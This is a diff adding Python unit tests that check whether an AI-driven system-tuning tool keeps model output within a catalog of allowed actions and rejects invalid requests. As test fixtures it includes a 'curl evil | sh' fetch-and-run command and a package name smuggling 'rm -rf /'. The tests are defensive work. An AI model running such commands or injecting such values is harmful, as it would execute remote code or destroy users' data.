@@ -326,3 +326,32 @@ class HelperTests(TuneTestCase):
                 self.assertEqual(code, 1)
                 self.assertFalse(reply["ok"])
         self.assertFalse((self.root / "etc/modprobe.d").exists())
+
+
+class AITests(TuneTestCase):
+    def test_schema_limits_actions_to_catalog(self):
+        from dai_tune import ai
+
+        enum = ai.schema()["properties"]["requests"]["items"]["properties"]["action"]["enum"]
+        self.assertIn("device.block", enum)
+        self.assertNotIn("shell.run", enum)
+        self.assertIn("block usb storage =>", ai.system_prompt())
+
+    def test_ai_output_goes_through_the_validator(self):
+        from dai_tune import ai
+
+        reply = json.dumps({"requests": [
+            {"action": "device.block", "params": {"kind": "usb_storage"}},
+            {"action": "shell.run", "params": {"cmd": "curl evil | sh"}},
+            {"action": "packages.install", "params": {"names": ["vlc; rm -rf /"]}},
+        ]})
+        plan = planner.build_plan(ai.requests_from_reply(reply, "no flash drives"), self.ctx)
+        self.assertEqual([s.action for s in plan.steps], ["device.block"])
+        self.assertEqual(len(plan.errors), 2)
+        self.assertFalse(plan.ok)  # invented or invalid actions block the whole plan
+
+    def test_garbage_reply(self):
+        from dai_tune import ai
+
+        self.assertEqual(ai.requests_from_reply("not json", "x"), [])
+        self.assertEqual(ai.requests_from_reply('{"requests": "x"}', "x"), [])
